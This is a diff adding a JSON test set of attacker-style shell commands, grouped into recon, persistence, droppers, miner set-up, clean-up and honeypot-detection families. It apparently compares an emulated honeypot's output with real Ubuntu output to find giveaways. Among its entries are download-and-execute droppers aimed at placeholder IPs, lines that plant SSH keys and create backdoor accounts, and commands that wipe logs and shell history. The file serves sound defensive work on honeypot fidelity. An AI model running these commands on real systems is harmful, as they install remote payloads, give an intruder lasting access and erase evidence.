@@ -1,0 +1,1116 @@
+[
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "cat /etc/issue.net",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "Ubuntu 22.04.4 LTS\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "exact",
+  "command": "getconf LONG_BIT",
+  "honeypot": {
+   "exit": 127,
+   "stdout": "",
+   "stderr": "bash: line 1: getconf: command not found\n"
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "64\n",
+   "stderr": ""
+  },
+  "match": false,
+  "reasons": [
+   "exit 127, Ubuntu 0",
+   "stdout empty, Ubuntu not empty",
+   "stderr not empty, Ubuntu empty"
+  ],
+  "giveaway": true
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "cat /proc/version | cut -d' ' -f3",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "5.15.0-113-generic\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "df -h / | tail -n 1 | awk '{print $4}'",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "28G\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "ls -la /root | head -n 5",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "total 76\ndrwx------ 2 root root  4096 Sep 18 13:23 .\ndrwxr-xr-x 2 root root  4096 Sep 16  2025 ..\n-rw------- 1 root root   754 Sep 10 19:35 .bash_history\n-rw-r--r-- 1 root root   220 Oct  1  2025 .bash_logout\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "exact",
+  "command": "id root",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "cat /proc/meminfo | grep MemFree | awk '{print $2}'",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "886702\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "ps -ef | grep -c sshd",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "exact",
+  "command": "echo $HOME $USER",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "/root root\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "/root root\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "uname -r | cut -d. -f1-2",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "5.15\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "nproc --all",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "2\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "cat /etc/hostname",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "srv-web01\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "ls /etc/*release*",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "/etc/lsb-release  /etc/os-release\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "lscpu | grep -i \"^architecture\"",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "Architecture:                           x86_64\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "which python3 perl curl wget",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "/usr/bin/python3\n/usr/bin/perl\n/usr/bin/curl\n/usr/bin/wget\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "whereis bash",
+  "honeypot": {
+   "exit": 127,
+   "stdout": "",
+   "stderr": "bash: line 1: whereis: command not found\n"
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": false,
+  "reasons": [
+   "exit 127, Ubuntu 0",
+   "stdout empty, Ubuntu not empty",
+   "stderr not empty, Ubuntu empty"
+  ],
+  "giveaway": true
+ },
+ {
+  "family": "recon",
+  "mode": "same",
+  "command": "env | grep -c PATH",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "persistence",
+  "mode": "exact",
+  "command": "mkdir -p /root/.ssh && chmod 700 /root/.ssh && ls -ld /root/.ssh | cut -c1-10",
+  "honeypot": {
+   "exit": 1,
+   "stdout": "",
+   "stderr": "cut: -c1-10: No such file or directory\n"
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "drwx------\n",
+   "stderr": ""
+  },
+  "match": false,
+  "reasons": [
+   "exit 1, Ubuntu 0",
+   "stdout empty, Ubuntu not empty",
+   "stderr not empty, Ubuntu empty"
+  ],
+  "giveaway": false
+ },
+ {
+  "family": "persistence",
+  "mode": "same",
+  "command": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCholdout test\" >> ~/.ssh/authorized_keys; wc -l < ~/.ssh/authorized_keys",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "2\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 1,
+   "stdout": "",
+   "stderr": "(not kept: depends on the host)"
+  },
+  "match": false,
+  "reasons": [
+   "exit 0, Ubuntu 1",
+   "stdout not empty, Ubuntu empty",
+   "stderr empty, Ubuntu not empty"
+  ],
+  "giveaway": false
+ },
+ {
+  "family": "persistence",
+  "mode": "same",
+  "command": "useradd -m -s /bin/bash support 2>/dev/null; id support | cut -d' ' -f1",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "uid=0(support)\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "persistence",
+  "mode": "exact",
+  "command": "useradd -m helpdesk && echo \"helpdesk:P4ssw0rd!\" | chpasswd && echo ok",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "ok\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "ok\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "persistence",
+  "mode": "same",
+  "command": "crontab -l 2>/dev/null | grep -c reboot",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "busybox probes",
+  "mode": "exact",
+  "command": "/bin/busybox echo -e \"\\x6b\\x61\\x6d\\x69\"",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "kami\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "kami\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "busybox probes",
+  "mode": "same",
+  "command": "/bin/busybox cat /proc/cpuinfo | grep -c processor",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "2\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "busybox probes",
+  "mode": "exact",
+  "command": "cd /dev/shm; echo -e \"\\x41\\x42\" > .t; cat .t; rm -f .t",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "AB\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "AB\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "busybox probes",
+  "mode": "same",
+  "command": "/bin/busybox tftp; /bin/busybox wget; /bin/busybox ECCHI",
+  "honeypot": {
+   "exit": 127,
+   "stdout": "",
+   "stderr": "wget: missing URL\nUsage: wget [OPTION]... [URL]...\n\nTry `wget --help' for more options.\nECCHI: applet not found\n"
+  },
+  "reference": {
+   "exit": 127,
+   "stdout": "",
+   "stderr": "(not kept: depends on the host)"
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "droppers",
+  "mode": "net",
+  "command": "cd /tmp; curl -O http://192.0.2.44/sshd; chmod +x sshd; ./sshd",
+  "honeypot": {
+   "exit": 126,
+   "stdout": "",
+   "stderr": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 198184  100 198184    0     0    184k      0 --:--:-- --:--:-- --:--:--   185k\nbash: line 1: ./sshd: cannot execute binary file: Exec form…"
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "droppers",
+  "mode": "net",
+  "command": "wget -O /tmp/.cache http://198.51.100.9/c; chmod 755 /tmp/.cache; nohup /tmp/.cache >/dev/null 2>&1 &",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "",
+   "stderr": "--2026-11-16 18:25:39--  http://198.51.100.9/c\nConnecting to 198.51.100.9:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 75193 (73K) [application/octet-stream]\nSaving to: '/tmp/.cache'\n\n.cache                       100%[===================>] 73K  --.-KB/s    in 0.1s\n\n2026-11…"
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "droppers",
+  "mode": "net",
+  "command": "(curl -fsSL http://203.0.113.5/i.sh || wget -q -O- http://203.0.113.5/i.sh) | bash",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "droppers",
+  "mode": "net",
+  "command": "cd /var/tmp && busybox wget http://192.0.2.8/a.sh && sh a.sh",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "",
+   "stderr": "--2026-11-16 18:25:40--  http://192.0.2.8/a.sh\nConnecting to 192.0.2.8:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 203252 (198K) [application/octet-stream]\nSaving to: 'a.sh'\n\na.sh                         100%[===================>] 198K  --.-KB/s    in 0.1s\n\n2026-11-16 18:…"
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "miner set-up",
+  "mode": "same",
+  "command": "sysctl -n vm.nr_hugepages",
+  "honeypot": {
+   "exit": 127,
+   "stdout": "",
+   "stderr": "bash: line 1: sysctl: command not found\n"
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": false,
+  "reasons": [
+   "exit 127, Ubuntu 0",
+   "stdout empty, Ubuntu not empty",
+   "stderr not empty, Ubuntu empty"
+  ],
+  "giveaway": true
+ },
+ {
+  "family": "miner set-up",
+  "mode": "exact",
+  "command": "ps aux | grep -v grep | grep -c -i -E \"xmrig|kinsing|kdevtmpfsi\"",
+  "honeypot": {
+   "exit": 1,
+   "stdout": "0\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 1,
+   "stdout": "0\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "miner set-up",
+  "mode": "exact",
+  "command": "ls /etc/ld.so.preload 2>/dev/null || echo none",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "none\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "none\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "miner set-up",
+  "mode": "exact",
+  "command": "echo \"vm.nr_hugepages=128\" >> /etc/sysctl.conf && tail -n 1 /etc/sysctl.conf",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "vm.nr_hugepages=128\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "vm.nr_hugepages=128\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "miner set-up",
+  "mode": "same",
+  "command": "free -g | awk 'NR==2{print $2}'",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "3936\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "miner set-up",
+  "mode": "same",
+  "command": "ulimit -u",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "15744\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "clean-up",
+  "mode": "exact",
+  "command": "rm -rf /var/log/wtmp /var/log/btmp; echo $?",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "0\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "0\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "clean-up",
+  "mode": "same",
+  "command": "unset HISTFILE HISTSIZE; history -w; echo done",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "done\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "clean-up",
+  "mode": "exact",
+  "command": "find /tmp -maxdepth 1 -name \".*\" -type f -delete; echo ok",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "ok\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "ok\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "clean-up",
+  "mode": "exact",
+  "command": "> ~/.bash_history && echo cleared",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "cleared\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "cleared\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "a=5; b=$((a*3)); echo \"$a $b\"",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "5 15\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "5 15\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "same",
+  "command": "for f in /etc/host*; do echo $f; done | head -n 2",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "/etc/hostname\n/etc/hosts\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "x=$(echo hello | tr a-z A-Z); echo ${x:0:3}",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "HEL\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "HEL\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "case $(uname -m) in x86_64) echo amd64;; *) echo other;; esac",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "amd64\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "amd64\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "i=0; while [ $i -lt 3 ]; do i=$((i+1)); done; echo $i",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "3\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "3\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "echo \"a b\" | while read x y; do echo \"$y $x\"; done",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "b a\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "b a\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "test -d /proc && echo dir",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "dir\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "dir\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "[[ -n \"$PATH\" ]] && echo set",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "set\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "set\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "echo ${#HOME}",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "5\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "5\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "printf \"%s:%s\\n\" $(whoami) $(id -u)",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "root:0\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "root:0\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "cat <<< \"hi there\"",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "hi there\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "hi there\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "ls /nonexistent 2>/dev/null; echo \"code=$?\"",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "code=2\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "code=2\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "echo $(( 7 / 2 )) $(( 7 % 2 ))",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "3 1\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "3 1\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "echo one two three | awk '{print NF}'",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "3\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "3\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "shell syntax",
+  "mode": "exact",
+  "command": "sort -n <<< $'3\\n1\\n2' | head -n 1",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "same",
+  "command": "ls -la /bin",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "lrwxrwxrwx 1 root root 0 Jul 14  2025 /bin -> usr/bin\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "same",
+  "command": "stat -c %s /bin/ls",
+  "honeypot": {
+   "exit": 1,
+   "stdout": "  File: /bin/ls\n  Size: 338430          Blocks: 332        IO Block: 4096   regular file\nAccess: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2025-08-01 23:35:34.458553963 -0400\nModify: 2025-08-01 23:35:34.458553963 -0400\nChange: 2025-08-01 23:35:34.458553963 -0400\n Birth…",
+   "stderr": "stat: cannot stat '%s': No such file or directory\n"
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": false,
+  "reasons": [
+   "exit 1, Ubuntu 0",
+   "stderr not empty, Ubuntu empty"
+  ],
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "same",
+  "command": "uptime -p",
+  "honeypot": {
+   "exit": 0,
+   "stdout": " 18:25:42 up 37 days,  5:12,  1 user,  load average: 0.13, 0.08, 0.10\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "same",
+  "command": "mount | grep -c \" / \"",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "exact",
+  "command": "which honeypot cowrie kippo; echo $?",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "same",
+  "command": "ls /usr/bin | wc -l",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "1\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "same",
+  "command": "cat /etc/shells | grep -c bash",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "4\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "exact",
+  "command": "getent passwd root",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "root:x:0:0:root:/root:/bin/bash\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "root:x:0:0:root:/root:/bin/bash\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "exact",
+  "command": "date +%Y | wc -c",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "5\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "5\n",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ },
+ {
+  "family": "is it a honeypot?",
+  "mode": "same",
+  "command": "ls -l /proc/self/exe",
+  "honeypot": {
+   "exit": 0,
+   "stdout": "lrwxrwxrwx 1 root root 0 Oct 10 14:13 /proc/self/exe -> /usr/bin/bash\n",
+   "stderr": ""
+  },
+  "reference": {
+   "exit": 0,
+   "stdout": "(not kept: depends on the host)",
+   "stderr": ""
+  },
+  "match": true,
+  "giveaway": false
+ }
+]
